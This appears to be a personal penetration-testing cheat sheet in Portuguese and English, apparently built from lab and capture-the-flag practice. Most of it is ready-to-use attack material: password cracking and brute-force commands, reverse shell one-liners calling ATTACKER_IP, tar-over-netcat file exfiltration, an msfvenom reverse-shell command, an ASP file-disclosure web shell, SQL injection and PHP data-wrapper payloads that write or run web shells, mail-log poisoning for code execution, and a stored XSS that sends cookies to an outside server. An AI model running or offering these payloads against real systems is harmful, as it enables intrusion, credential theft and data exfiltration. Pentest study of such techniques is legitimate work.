unshadow passwd shadow >  hashes_formatadas
```
```
john hashes_formatadas
```

# crypt

| `$1$`     | **MD5**      | `-m 500`  | Antigo e inseguro (evitar).               |
| --------- | ------------ | --------- | ----------------------------------------- |
| `$2a$`    | **Blowfish** | `-m 3200` | Usado no bcrypt (com custo de CPU).       |
| `$5$`     | **SHA-256**  | `-m 7400` | Mais seguro que MD5.                      |
| `$6$`     | **SHA-512**  | `-m 1800` | Padrão em sistemas Linux modernos.        |
| `$y$`     | **yescrypt** | `-m 2900` | Novo (usado em algumas distros recentes). |
| `$argon2` | **Argon2**   | `-m 7200` | Resistente a GPUs/ASICs (mais raro).      |

## bruteforce

```
john --wordlist=<wordlist> --rules --stdout > <output> #/etc/john/john.conf
cewl <site> -m <min-chars> 
hydra -v -l <user> -p <pass> -M <targets> <protocol> 
hydra -v -L <user_list> -P <pass_list> <protocol>://<ip>:<port> 
crunch <min> <max> -t ruhptura%^@, -o <output>
```

| %   | number       |
| --- | ------------ |
| ^   | special char |
| @   | lowercase    |
| ,   | uppercase    |

# wget
para baixar todo conteudo de uma página
```
wget -m <URL>
```

realiza a cópia de um site
```
wget -mpEk https://example.com
```
https://www.howtogeek.com/how-to-copy-a-whole-website-to-your-computer-using-wget/
# grep
search for a string in a specific directory
```
grep -ri "desec" /caminho/do/diretorio 2>/dev/null
```

## regex

- `$` indica o final da linha
- `^` indica o inicio da linha

Key regex patterns used in `grep`, `sed`, `awk`, Python, Perl, JavaScript, etc.

### 1. Basic Metacharacters

| Regex | Description | Example |
|-------|-------------|---------|
| `.`   | Matches **any character** (except newline) | `a.c` → `abc`, `aXc` |
| `^`   | Matches the **start of a line** | `^abc` → `abc` at line start |
| `$`   | Matches the **end of a line** | `xyz$` → `xyz` at line end |
| `*`   | Matches **0 or more** repetitions of the previous character | `ab*c` → `ac`, `abc`, `abbc` |
| `+`   | Matches **1 or more** repetitions of the previous character | `ab+c` → `abc`, `abbc` (not `ac`) |
| `?`   | Matches **0 or 1** repetition of the previous character | `ab?c` → `ac`, `abc` |
| `\`   | Escapes a metacharacter (treats it literally) | `\.` → Matches a literal dot (`.`) |
### 2. Character Classes

| Regex     | Description | Example |
|-----------|-------------|---------|
| `[abc]`   | Matches **a, b, or c** | `[aeiou]` → Any vowel |
| `[^abc]`  | Matches **any character except a, b, c** | `[^0-9]` → Non-digit |
| `[a-z]`   | Matches any lowercase letter | `[a-z]` → `a`, `b`, ..., `z` |
| `[A-Z]`   | Matches any uppercase letter | `[A-Z]` → `A`, `B`, ..., `Z` |
| `[0-9]`   | Matches digits | `[0-9]` → `0`, `1`, ..., `9` |
| `\d`      | Equivalent to `[0-9]` (digit) | `\d\d` → `42`, `99` |
| `\D`      | Non-digit (`[^0-9]`) | `\D+` → `abc`, `!@#` |
| `\w`      | Word character (`[a-zA-Z0-9_]`) | `\w+` → `hello`, `x1` |
| `\W`      | Non-word character (`[^\w]`) | `\W` → `!`, ` ` (space) |
| `\s`      | Whitespace (space, tab, newline) | `\s+` → `   `, `\t` |
| `\S`      | Non-whitespace | `\S+` → `abc`, `123` |
### 3. Quantifiers

| Regex   | Description | Example |
|---------|-------------|---------|
| `{n}`   | Exactly **n** repetitions | `a{3}` → `aaa` |
| `{n,}`  | **n or more** repetitions | `a{2,}` → `aa`, `aaa`, ... |
| `{n,m}` | Between **n and m** repetitions | `a{2,4}` → `aa`, `aaa`, `aaaa` |
### 4. Groups and Capturing

| Regex      | Description | Example |
|------------|-------------|---------|
| `(abc)`    | Groups characters | `(ab)+` → `ab`, `abab` |
| `(a\|b)`   | Alternation (a or b) | `(cat\|dog)` → `cat` or `dog` |
| `(?:abc)`  | Non-capturing group | `(?:ab)+` (group not stored) |
### 5. Anchors and Boundaries

| Regex      | Description | Example |
|------------|-------------|---------|
| `\b`       | Word boundary | `\bword\b` → `word` but not `password` |
| `\B`       | Non-word boundary | `\Bword\B` → `password` but not `word` |
| `(?=abc)`  | Positive lookahead (followed by `abc`) | `a(?=bc)` → `a` in `abc` |
| `(?!abc)`  | Negative lookahead (not followed by `abc`) | `a(?!bc)` → `a` in `adef` |
### 6. Practical Examples

- **Find emails**: `[\w.-]+@[\w.-]+\.\w+`
- **Validate date (dd/mm/yyyy)**: `^\d{2}/\d{2}/\d{4}$`
- **Extract HTML tags**: `<[^>]+>`
- **Find words ending with "ing"**: `\b\w+ing\b`

### Notes

- Default `grep` uses **basic regex (BRE)**. For extended regex (ERE), use `grep -E` or `egrep`.
- In **Perl, Python, JavaScript**, syntax is richer (includes `\d`, `\s`, etc.).
- **Greedy (`*`) vs. lazy (`*?`)** quantifiers in advanced regex.

> Tip: Use tools like [Regex101](https://regex101.com/) to test your patterns!
# ritual
**versão python3:**
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
ls
export TERM=xterm
```

versão python2:
```
python -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
ls
export TERM=xterm
```

# hashes

## pbkdf2$50000$50

### hashcat
formatado pbkdf2$50000$50 hashcat -m 10900
```
sha256:iterations:salt_base64:hash_base64
```

opção 1: python script
hash_pbkdf2$50000$50_decrypt.py
```
python3 hash_pbkdf2$50000$50_decrypt.py


Digite o número de iterações: 50000
Digite o salt em hexadecimal: 8bf3e3452b78544f8bee9400d6936d34
Digite o hash em hexadecimal: e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56

String formatada: sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

opção 2: bash script
```
sqlite3 file.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```

#### decrypt 

**Hashcat -m  10900**
```
sha256:iterations:salt_base64:hash_base64

hashcat -m 10900 hash_developer_formata.txt /usr/share/wordlists/rockyou.txt
```



## identificar hashes
- hashid
# vim
```
:w !sudo tee /path/to/file/arquivo
```

# enum4linux
```
enum4linux -a 172.16.1.107
```
# crackmapexec
```
crackmapexec smb <hosts> -u <user> -p <pass> [-x <cmd>]
```

```
sudo crackmapexec smb 10.10.11.35 -d cicada.htb -u @users.txt -p '' --shares
```

validando credenciais:
```
sudo crackmapexec smb hosts.txt -d cicada.htb -u <USER> -p <PASS>
```



## Relative Identifier (RID)
O RID é a parte final de um **SID (Security Identifier)**, que identifica de forma exclusiva contas de usuários, grupos ou outros objetos de segurança
RIDs Comuns em Sistemas Windows

Estrutura do SID e o Papel do RID
```
S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-RID
```
- `S-1-5`: Identificador padrão do Windows.
- `21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX`: Porção única associada ao domínio ou computador. É chamado de **SID base**.
- RID: Identificador específico que diferencia contas, grupos ou outros objetos dentro do mesmo domínio ou sistema.

bruteforce de RID (requer algum usuario validado
```
crackmapexec smb 10.10.11.35 -u [USER] -p '' -d cicada.htb --shares --rid-brute

nxc smb 10.10.11.35 -u [USER] -p '' -d cicada.htb --shares --rid-brute
```

| **RID**   | **Descrição**                          |
| --------- | -------------------------------------- |
| **500**   | Administrador                          |
| **501**   | Convidado                              |
| **512**   | Grupo Administradores do Domínio       |
| **513**   | Grupo Usuários do Domínio              |
| **1000+** | Contas de usuários criadas manualmente |


# low level

## windows
Compiling ASM code on Windows:

```powershell
nasm -f win32 <file.nasm>
golink [/console] /entry _main [<dll>] [/mix]
```

Example code using Windows API:
```
extern MessageBoxA
global _main

section .data
	ttitle db 'Get Rekt',0
	ttext db 'Lorem ipsum',0

section .text
_main:
	push 1
	push ttitle
	push ttext
	push 0
	call MessageBoxA
```

## linux
- syscalls - https://syscalls.w3challs.com/
Compiling ASM code on Linux:
```
nasm -f elf32 <file.nasm>
ld -entry _main [-m elf_i386] <file.o> -o <out>
```

using a syscall example
```
global _main
section .data
	msg db 'Hello Bitch',0xa

section .text
_main:
	mov rax, 1 ;write
	mov rdi, 1 ;stdout
	mov rsi, msg
	mov rdx, 12
	syscall
	
	mov rax, 0x3c ;exit
	mov rdi, 0 ;status code
	syscall
```


monitorando syscalls
```
strace ./teste
```
### gdb
adiciona breakpoint
```
breakpoint <_section> 
```
remove todos os breakpoints
```
delete breakpoints 
```
remove breakpoint específico
```
info break
del <num_breakpoint>

```
informações dos registradores|funções
```
info <register|functions>
```
step into
```
si
```
realiza o disassembly
```
disas
```
trocar a syntax da at&t para intel no gdb
```
set disassembly-flavor intel
```
visualizar conteudo de endereço de memória
```
x/s 0x402000
```

#### gdb tui
gdb com interface
```
gdb ./teste -tui
```

mostra as informações dos registradores/assembly no layout
```
layout <asm|regs>
```


## buffer overflow

passos para conseguir uma shell com BOF
1. descobrir se o programa é vulneravel a BOF
2. encontrar a quantidade certa de bytes para atingir EIP
3. testar o controle do EIP
4. testar bad characters (bad chars)
5. encontra um bom endereço de retorno
6. gerar shellcode
7. conseguir shell

Em C procurar por funções `scanf`, `gets` e `strcpy`

**shellcode**
1. coleta de informações (identificar o software e entender como funciona a comunicação)
2. fuzzing (enviar diversos tipos de dados a fim de testar o comportamento do software)
3. identificar a vulnerabilidade (atingir EIP)
4. controlar EIP (validar espaços)
5. identificar badchars
6. identificar o endereço de retorno
7. testar a execução
8. gerar shellcode
9. exploit final



**offset**
**busca manual:** fazemos um "busca binária", testando quantos bytes precisamos enviar para que a aplicação pare de funcionar

**busca automatizada:**  
```
/usr/bin/msf-pattern_create -l <length> 
/usr/bin/msf-pattern_offset -l <length> -q <4_bytes_HEX> # hex sem o 0x

# exemplo particular
/usr/bin/msf-pattern_create -l 2200 # gera payload de 2200 bytes
/usr/bin/msf-pattern_offset -l 2200 -q 43396f43 # 43396f43 são os dados que crasharam o programa
```


**payload**
Overwrite the return address with a “jmp rsp” (specially if any library doesn’t have ASLR), and then overwrite the RSP space, which comes right after the return in the stack, with some nopsledges and the shell code.
Shell code generation:
```
msfvenom -p windows/shell_reverse_tcp lhost=<ip> lport=<port> exitfunc=thread -b <badchars|'\0x00'> -f <c|python>
```

## DEP (data execution prevention)

## ASLR (address space layout randomization)

# python
estabelecer conexão com servidor:
```
#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.5", 5800))
banner = s.recv(1024)
print(banner)
s.send("help\r\n")
s.recv(1024)
```

fuzzing:
```
#!/usr/bin/python
import socket
lista = ["A"]
contador = 100

while len(lista) <= 50:
	lista.append("A"*contador)
	contador = contador+100

for dados in lista:
	print(f"Fuzzing com send {len(dados)}")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.0.5", 5800))
	banner = s.recv(1024)
	s.send("SEND "+dados+"\r\n")
```


# exploits públicos
```
searchsploit <search> [--exclude="phpMy|Dans"] [--id]
```

baixando exploit pelo ID
```
searchsploit ipfire --id -m <exploit_ID>
```



# container
## Comandos Básicos de Contêiner
| Comando                                                 | Descrição                    | Exemplo                                      |
| ------------------------------------------------------- | ---------------------------- | -------------------------------------------- |
| `docker ps`                                             | Lista containers ativos      | `docker ps`                                  |
| `docker ps -a`                                          | Lista todos containers       | `docker ps -a`                               |
| `docker start <container>`                              | Inicia container             | `docker start gitea`                         |
| `docker stop <container>`                               | Para container               | `docker stop gitea`                          |
| `docker restart <container>`                            | Reinicia container           | `docker restart gitea`                       |
| `docker rm <container>`                                 | Remove container             | `docker rm gitea`                            |
| `docker rm -f <container>`                              | Remove forçadamente          | `docker rm -f gitea`                         |
| `sudo docker exec -it <container-id-ou-nome> /bin/bash` | Acessa terminal do container | `sudo docker exec -it tomcat7_alt /bin/bash` |
## Monitoramento e Logs
| Comando | Descrição | Exemplo |
|---------|-----------|---------|
| `docker logs <container>` | Mostra logs | `docker logs gitea` |
| `docker logs -f <container>` | Logs em tempo real | `docker logs -f gitea` |
| `docker stats` | Monitora recursos | `docker stats` |
| `docker top <container>` | Processos do container | `docker top gitea` |
## Gerenciamento de Imagens
| Comando | Descrição | Exemplo |
|---------|-----------|---------|
| `docker images` | Lista imagens | `docker images` |
| `docker pull <imagem>` | Baixa imagem | `docker pull gitea/gitea` |
| `docker rmi <imagem>` | Remove imagem | `docker rmi gitea/gitea` |
## Execução Interativa
| Comando | Descrição | Exemplo |
|---------|-----------|---------|
| `docker exec -it <container> bash` | Acessa terminal | `docker exec -it gitea bash` |
| `docker run -it <imagem> sh` | Container temporário | `docker run -it alpine sh` |
## Docker Compose
| Comando                | Descrição       | Exemplo                |
| ---------------------- | --------------- | ---------------------- |
| `docker-compose up -d` | Inicia serviços | `docker-compose up -d` |
| `docker-compose down`  | Para e remove   | `docker-compose down`  |
| `docker-compose logs`  | Mostra logs     | `docker-compose logs`  |
## Backup e Limpeza
| Comando                                | Descrição      | Exemplo                          |
| -------------------------------------- | -------------- | -------------------------------- |
| `docker cp <container>:<path> <local>` | Copia arquivos | `docker cp gitea:/data ./backup` |
| `docker system prune`                  | Limpeza geral  | `docker system prune`            |
| `docker volume prune`                  | Limpa volumes  | `docker volume prune`            |
# gitea
API base URL
```
http://gitea.titanic.htb/api/v1
```



# web

## vhost / subdomain / subdomínio
O arquivo `/etc/hosts` pode conter informações acerca dos vhosts
```
127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

## nmap

**path to scripts**
```
/usr/share/nmap/scripts

```

**checking if the host are vulnerable to eternalblue (CVE-2017-0143)**
```
nmap -script=smb-vuln-ms17-010.nse -sV -Pn 172.16.1.145 -p 445                   
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.30 seconds
```
## reverse shell
```
# exemplo 1
nc ATTACKER_IP OPENNED_PORT -c /bin/bash

# exemplo 2
nc ATTACKER_IP OPENNED_PORT -e /bin/bash

# exemplo 3
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER OPENNED_PORT > /tmp/f

# exemplo 4
bash -i >& /dev/tcp/ATTACKER_IP/OPENNED_PORT 0>&1

```
- `-e` Essa opção foi **removida** em versões mais recentes do `netcat`, como a do OpenBSD (`netcat-traditional` não tem `-e`)
- `-c` Essa opção só existe em algumas versões do `netcat` (como a GNU Netcat), mas não funciona no OpenBSD `netcat`
### envio de multiplos arquivos
atacante
```
nc -lvp 1234 | tar xvf -
```
**opção 1:** escolhendo os arquivos a serem enviados:
servidor
```
tar cf - arquivo1.txt arquivo2.txt | nc ATTACKER_IP 1234
```

**opção 2:**  enviando a pasta toda
```
tar cf - minha_pasta | nc ATTACKER_IP 1234
```

**reverse shell .php**
- https://github.com/flozz/p0wny-shell/tree/master

**Firewall:**
- o firewall pode bloquear reverse shell para portas acima de 1024, neste caso é bom tentarmos realizar reverse shell em portas de serviços web (80/443)

## microsoft iis
No IIS, por algum motivo, quando eu criei o arquivo `sam_copy` ele não deixou isso visivel no servidor web, apenas quando eu coloquei a extensão .txt, ou seja, por algum motivo só ficou visivel com o nome de arquivo `sam_copy.txt`, eu tentei com extensão que não existia ex: `sam_copy.ablablue` mas n funcionou.

### asp
https://medium.com/@far00t01/asp-net-microsoft-iis-pentesting-04571fb071a4
script to directory and file disclosure:
```
# ex: http://HOST/file.asp?diretorio=C:\&arquivo=key.txt

<%
    Dim objFSO, objFolder, objSubfolder, objFile, diretorioAlvo, arquivoAlvo, diretorio, arquivo
    Dim objTextFile, fileContent

    ' Obtém os parâmetros passados pela URL (diretorio e arquivo)
    diretorio = Request.QueryString("diretorio")
    arquivo = Request.QueryString("arquivo")

    ' Se nenhum diretório for passado, define um diretório padrão
    If diretorio = "" Then
        diretorioAlvo = "C:\"
    Else
        diretorioAlvo = diretorio
    End If

    ' Se nenhum arquivo for passado, não tenta abrir o arquivo
    If arquivo = "" Then
        arquivoAlvo = ""
    Else
        arquivoAlvo = diretorioAlvo & "\" & arquivo
    End If

    ' Criar objeto do sistema de arquivos
    Set objFSO = Server.CreateObject("Scripting.FileSystemObject")

    ' Verifica se o diretório existe
    If objFSO.FolderExists(diretorioAlvo) Then
        Set objFolder = objFSO.GetFolder(diretorioAlvo)
        
        Response.Write "<h2>📁 Conteúdo em " & diretorioAlvo & ":</h2><ul>"
        
        ' Percorre os subdiretórios
        For Each objSubfolder In objFolder.SubFolders
            Response.Write "<li><strong>Diretório:</strong> " & objSubfolder.Name & "</li>"
        Next

        ' Percorre os arquivos
        For Each objFile In objFolder.Files
            Response.Write "<li><strong>Arquivo:</strong> " & objFile.Name & "</li>"
        Next
        
        Response.Write "</ul>"

        ' Se um arquivo foi especificado, tenta abrir e ler o arquivo
        If arquivoAlvo <> "" Then
            If objFSO.FileExists(arquivoAlvo) Then
                Set objTextFile = objFSO.OpenTextFile(arquivoAlvo, 1) ' 1 = ForReading
                fileContent = objTextFile.ReadAll
                Response.Write "<h3>📄 Conteúdo do arquivo " & arquivoAlvo & ":</h3>"
                Response.Write "<pre>" & fileContent & "</pre>"
                objTextFile.Close
            Else
                Response.Write "<p>❌ Arquivo não encontrado: " & arquivoAlvo & "</p>"
            End If
        End If
        
        ' Fecha o objeto
        Set objFolder = Nothing
    Else
        Response.Write "<p>❌ Diretório não encontrado: " & diretorioAlvo & "</p>"
    End If

    ' Limpa o objeto
    Set objFSO = Nothing
%>

```

## SQL
**comandos SQL**
loga no banco de dados
```
sudo mysql -u root -p
```
inicia o serviço do banco de dados
```
sudo systemctl start mysql # inicia
sudo systemctl status mysql # status
```
auto start sql
```
sudo systemctl disable mysql
systemctl is-enabled mysql
```
mostra os bancos de dados
```
show databases;
```
exibe o usuário que estamos conectados
```
select user();
```
exibe o banco de dados que estamos conectados
```
select database();
```

obs: no banco mysql na tabela user tem mapeados usuário e senha dos usuários mysql

retorna mais de um campo em apenas 1 consulta, separando os campos por `:`
```
select concat(login,':', senha) from usuarios;
```
leitura de arquivo
```
select load_file('/var/www/html/index.html');
```
sleep
```
select sleep(10);
```
describe
```
describe <table_name>;
```

### SQL injection
wordlist com payloads para sql injection
```
/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
https://github.com/payloadbox/sql-injection-payload-list
```

**error based** 
```
'
\
"
```

Leitura de arquivo no servidor
```
select * from usuarios where login='' union select 1,2,LOAD_FILE('/var/www/html/payload.php');
```

Escrita de arquivo no servidor:
```
select * from usuarios where login='' union select 1,2,'PAYLOAD' INTO OUTFILE '/var/www/html/payload.php';

select * from usuarios where login='' union select 1,2,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/payload.php';


```
obs: no exemplo abaixo a tabela possui 3 colunas:

**Addslashes**
exibe os caracteres em hexadecimal
```
echo -n 'frase qualquer' | od -An -tdC
```

#### Blind
verifica se a primeira letra do nome da base de dados é `d`
```
' and ascii(substring(database(),1,1)) == 100 #
' and ascii(substring(database(),INDEX,1)) == 100 #
```

**exemplos de payloads (decodados)**
```
# Exemplo 1
## exemplo generico
GET /produtos.php?mprod=0&cat==26 AND (SELECT [QUALQUER_NUMERO] FROM (SELECT(SLEEP(3)))[QUALQUER_STRING])&subcat=161&pag=3 HTTP/1.1

## exemplo particular
GET /produtos.php?mprod=0&cat==26 AND (SELECT 111111111111111234 FROM (SELECT(SLEEP(3)))string_qualquer_aqui)&subcat=161&pag=3 HTTP/1.1

## exemplo local
SELECT 11111111111111118818 FROM (SELECT(SLEEP(3)))string_qualquer_aqui;


```
obs: No exemplo 1, apenas o parametro `cat` era vulnerável à sql injection

```
select * from usuarios;
+----+---------+-----------+
| id | nome    | senha     |
+----+---------+-----------+
|  1 | alice   | senha123  |
|  2 | bob     | 1234senha |
|  3 | charlie | passw0rd  |
+----+---------+-----------+
3 rows in set (0.000 sec)


MariaDB [teste]> select * from usuarios where id = sleep(5);
Empty set (15.020 sec)


```

#### sqlmap
**descobrindo sql injection**
```
sqlmap -u "[URL]"

# exemplo
sqlmap -u "http://172.16.1.245/produtos.php?mprod=0&cat=26&subcat=161&pag=3" 

# testando sql injection num parametro específico -p <param>
sqlmap -u "http://172.16.1.116/acs/admin.php?pw=admin&page=/acs/index.php&del=3" -p del
```

**Retrieve de informações**
```
# (queremos descobrir as bases de dados) enumeração das bases de dados
sqlmap -u "http://172.16.1.245/produtos.php?mprod=0&cat=26&subcat=161&pag=3" --dbs

# dump do banco de dados
sqlmap -u "http://172.16.1.245/produtos.php?mprod=0&cat=26&subcat=161&pag=3" -D deckstore --dump --batch
```

flags relevantes
```
-D [DB]  # DBMS database to enumerate

-T [TBL] # DBMS database table(s) to enumerate

-C [COL] # DBMS database table column(s) to enumerate

```

arquivo de outputs do sqlmap
```
/home/kali/.local/share/sqlmap/output/
```

**validating if a file exist with sqlmap**
```
sqlmap -u "http://172.16.1.116/acs/admin.php?pw=admin&page=/acs/index.php&del=3" -p del --search -F "index.php"
```

**reading the file content with sqlmap**
```
sqlmap -u "http://172.16.1.116/acs/admin.php?pw=admin&page=/acs/index.php&del=3" -p del --file-read="/var/www/acs/index.php"
```


#### SQL -> RCE
falta fazer
```
# escreve um payload em php e salva no diretório especificado
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

# leitura de arquivo
SELECT LOAD_FILE('/etc/passwd');




```

## ferramentas de fuzzing
- gobuster
- ffuf

### gobuster

**fuzzing de diretorios**
```
gobuster dir -u <URL:PORT> -w <WORDLIST> [-x .php,.txt,.bkp,.sql] [-t THREADS] -e [-s HTTP_CODE_RESPONSE] [-a USER_AGENT] 
```

```
gobuster dir -u http://10.10.206.2 -w ~/wordlist/SecLists/Discovery/Web-Content/raft-large-directories.txt -t 100 -e 
```
-e printa a url toda
-t numero de threads
-u url
-x string              File extension(s) to search for (dir mode only)
-p string              Proxy to use for requests [http(s)://host:port] (dir mode only)

**cookies e proxy**
```
gobuster dir -u [URL] -w [WORDLIST] -e -H ["HEADER_OPTION"] --proxy http://127.0.0.1:8080


gobuster dir -u http://172.16.1.245/ -w /usr/share/wordlists/dirb/big.txt -e -H "Cookie: __utmz=254144200.1741386129.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utma=254144200.298784931.1741386129.1741386129.1741393732.2; PHPSESSID=l64i0ecjv41e20k72nqvib5aq0" --proxy http://127.0.0.1:8080
```

**subdomain enumeration**
```
gobuster dns -d grupobusinesscorp.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Correção de Erro:**
similar ao que ocorre no `fuff` onde toda requisição retorna status code 200, neste caso devemos filtrar as requisições
```
Error: the server returns a status code that matches the provided options for non existing urls. http://172.16.1.240:10000/f2110493-95d4-4f6d-8ecb-2700cfdf499f => 200 (Length: 1591). To continue please exclude the status code or the length

# comando corrigido
gobuster dir -u [URL] -w [WORDLIST] -e --exclude-length 1591

# comando com erro
gobuster dir -u [URL] -w [WORDLIST] -e
```

### ffuf
bruteforce de +1 parametro
```
ffuf -w users.txt:USER -w passwords.txt:PASS -u http://blog.thm/wp-login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "log=USER&pwd=PASS&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1"
```

proxy burp `-x`
```
-x http://127.0.0.1:8080
```

filtrar uma resposta `-fr`
```
ffuf -u URL/FUZZ -w /wordlists.txt -fr "An Error Occurred"
```

header `-H`
```
-H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: wordpress_test_cookie=WP+Cookie+check" 
```

filtrando resposta `fr`
```
-fr "Invalid username"
```
não exibe resultados que contenham a frase `Invalid username`

**enumerando virtualhost (vhost)/subdomínio:**
```
# wordlist de dns
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

# forma 1
ffuf -u "http://172.16.1.240/" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ'

# forma 2
ffuf -u "http://FUZZ.mysite.htb/" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

A forma 2 só funcionará se:
- O servidor usa **DNS interno** ou configurações de `/etc/hosts` para mapear subdomínios para o IP `172.16.1.240`.

### Match Case
Existe a possibilidade do dev ter configurado um status code esquisito que o ffuf não pega por padrão.

Por padrdão o ffuf pega os seguintes status code:
```
Matcher          : Response status: 200-299,301,302,307,401,403,405,500
```

Para dar match apenas no status code `400` e `401`
```
ffuf -u 'example.com' -w wordlist.txt -mc 400,401
```

## metodos aceitos (get, put, options, head,post)
- validar os métodos aceitos em cada um dos diretórios da aplicação

nmap
```
nmap -p <HTTP_PORT> --script http-methods <TARGET_IP>
```

metodos com curl
```
curl -v -X options <URL>
```
metodos com curl
```
curl -X PUT <URL/teste.php>
curl -X PUT <URL/teste.php> -d "<?php system('id');?>"
curl [-v] <URL> --upload-file shell.php
curl -X DELETE <URL/teste.php>
```

netcat:
```
nc -v <IP> <PORT> -C
PUT /webdav/teste.php HTTP/1.1
Host: <IP>
```

### WEBDAV
é um conjunto de extensões para o protocolo HTTP que permite que os usuários gerenciem arquivos em servidores remotos

utilitário para estabelecer conexão com webdav
```
cadaver <URL>
```
testa os métodos http e envia arquivos para o servidor
```
davtest --url <URL>
```


## null byte poisoning
caso o servidor adicione `.php` automaticamente ao final de `file`, o null byte (`%00`) interrompe o processamento da string, resultando na tentativa de carregar o arquivo `/etc/passwd` diretamente, ignorando a extensão.
```
GET /index.php?file=/etc/passwd%00 HTTP/1.1
```

## Local File Inclusion (LFI)
- payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md

infecção de logs com LFI/php
FALTA FAZER (testar no 172.16.1.10)

path com wordlists com payloads de LFI
```
/usr/share/seclists/Fuzzing/LFI/
```

diretorios de email smtp
```
/var/mail/USER
/var/spool/mail/USER
/var/mail/www-data
/var/spool/mail/www-data
```

RCE via smtp
```
telnet 172.30.0.128 25
Trying 172.30.0.128...
Connected to 172.30.0.128.
Escape character is '^]'.
MAIL FROM:romio
RCPT220 ubuntu.bloi.com.br ESMTP Postfix (Ubuntu)
 250 2.1.0 Ok
RCPT TO:www-data@ubuntu.local   
502 5.5.2 Error: command not recognized
MAIL FROM:romio
503 5.5.1 Error: nested MAIL command
RCPT TO:www-data@ubuntu.local
250 2.1.5 Ok
data 
354 End data with <CR><LF>.<CR><LF>
<?php echo system($_GET['hack']);?>
.
250 2.0.0 Ok: queued as 23781C007F


# requisição
http://172.30.0.128/supportdesk/index.php?page=/var/mail/www-data&hack=whoami

```


## XSS
ferramenta para automatizar teste de XSS
```
https://github.com/s0md3v/XSStrike.git
```

### reflected
```
<script>alert("VULNERAVEL")<script>
```
payloads: https://github.com/payloadbox/xss-payload-list


### self
exibe o proprio cookie
```
<script>alert(document.cookie)</script>
```
redefine o proprio cookie
```
<script>alert(document.cookie="PHPSESSID=3u23181nqsq4q02u1n42pk9vq7")</script>
```

### stored
captura o cookie de quem acessou a página com stored XSS e envia para o nosso servidor
```
<script> new Image().src="http://IP:PORT/?="+document.cookie;</script>
```


## command injection

commix
```
commix --url URL --data="site=[URL]"
```

## metadados de imagem
```
exiv2 [image.png]

exiftool [image.png]
```
## upload image
imagetragick

**bypass de file upload**
- https://sagarsajeev.medium.com/file-upload-bypass-to-rce-76991b47ad8f

renomear o arquivo:
```
payload.pHp
payload.pdf.php
payload.p.phphp # em alguns casos remove a string php, restando payload.php
```



em alguns casos, basta trocar o Content-type para dar bypass na extensão permitida:
no exemplo abaixo o site permitia apenas arquivos .pdf
```
# antes
Content-Type: application/x-php
# depois
Content-Type: application/pdf
```

## php 

bruteforce de parametros
```
ffuf -u "URL/banners.php?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

fuzzing de arquivos .php
```
ffuf -u "URL/FUZZ.php" -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

### wrappers
https://hacktricks.boitatech.com.br/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers
```
file:// — Accessing local filesystem
http:// — Accessing HTTP(s) URLs
ftp:// — Accessing FTP(s) URLs
php:// — Accessing various I/O streams
zlib:// — Compression Streams
data:// — Data (RFC 2397)
glob:// — Find pathnames matching pattern
phar:// — PHP Archive
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — Audio streams
expect:// — Process Interaction Streams
```
php wrappers data
```
echo -n '<?php system(id);?>' | base64
PD9waHAgc3lzdGVtKGlkKTs/Pg==


view-source:http://rh.businesscorp.com.br/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKGlkKTs/Pg==

```
```
echo -n '<?php echo system($_GET["hack"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImhhY2siXSk7Pz4=

